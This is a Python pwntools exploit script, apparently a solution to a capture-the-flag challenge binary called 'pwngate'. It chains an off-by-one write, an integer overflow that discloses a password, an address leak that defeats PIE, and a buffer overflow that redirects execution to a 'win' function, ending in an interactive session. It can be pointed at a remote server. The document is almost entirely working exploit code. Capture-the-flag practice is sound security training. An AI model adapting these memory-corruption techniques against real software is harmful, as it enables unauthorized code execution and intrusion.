#!/usr/bin/env python3

from pwn import *

elf = ELF("./pwngate_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

gdbscript="""
continue
"""

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

r = conn()

def obo_fate(obo):
    r.sendlineafter("Enter choice: ", "1")
    r.sendlineafter("Choose where to leap: ", b"A"*8 + pack(obo)) 
def answer_questions():
    r.sendlineafter("Choose: ", "1")
    for i in range(4):
        r.recvline()
        r.sendline("M"*(0x30 - 1))


def main():
    
    r.sendlineafter("Enter your name: ", "zr0x")
    obo_fate(0xec)
    r.sendlineafter("Enter choice: ", "2")
    r.sendlineafter("Choose what to do: ", str(0x100000000))
    r.recvuntil("Your password is: \n")
    password = r.recvline().strip()
    print(b"PASS is " + password)
     
    r.sendlineafter("Enter choice: ", "3")
    r.sendlineafter("Choose: ", "3")
    r.sendlineafter("Choose: ", "2")
    
    r.recvline()
    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    log.info("Leak " + hex(leak))

    answer_questions()

    r.sendlineafter("Choose: ", "4")
    elf.address = leak - 0x3d48
    r.sendlineafter("Enter choice: ", "4")
    r.sendlineafter("\n", password)
    r.sendlineafter("are?: ", b"A"*0x18 + p64(elf.sym.win))
    r.sendlineafter("Enter choice: ", "2")

    r.interactive()


if __name__ == "__main__":
    main()
